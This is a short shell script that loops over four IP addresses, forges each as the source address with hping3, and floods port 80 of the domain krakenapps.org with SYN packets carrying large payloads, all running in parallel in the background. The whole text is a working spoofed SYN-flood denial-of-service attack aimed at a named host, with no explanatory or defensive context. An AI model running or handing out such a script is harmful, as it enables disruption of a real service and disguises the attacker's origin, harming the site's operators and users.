IP="10.51.51.1 10.51.51.2 10.51.51.3 10.51.51.4"

for i in $IP; do
	hping3 -a $i krakenapps.org -p 80 -S -d 1000000 --flood &
done
